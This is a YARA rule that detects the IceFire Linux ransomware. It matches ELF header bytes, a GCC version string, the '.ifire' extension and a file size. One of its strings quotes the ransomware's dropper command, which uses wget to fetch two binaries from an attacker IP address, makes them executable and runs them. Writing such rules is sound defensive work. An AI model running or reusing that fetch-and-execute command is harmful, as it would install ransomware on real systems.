rule icefire_linux {
    meta:
        description = "Detects IceFire Linux ransomware version SHA-1: b676c38d5c309b64ab98c2cd82044891134a9973"
        author = "Fevar54"
        reference = "https://www.sentinelone.com/labs/icefire-ransomware-returns-now-targeting-linux-enterprise-networks/"
    strings:
        $magic = { 7F 45 4C 46 02 01 01 03 00 00 00 00 00 00 00 00 }
        $gcc = "GCC: (GNU) 4.8.5"
        $wget = "sh -c rm -f demo iFire && wget hxxp[://]159.65.217.216:8080/demo && wget hxxp[://]159.65.217.216:8080/{redacted_victim_server}/iFire && chmod +x demo && ./demo"
        $extension = ".ifire"
    condition:
        $magic at 0 and $gcc and $wget and $extension and filesize == 2217728
}
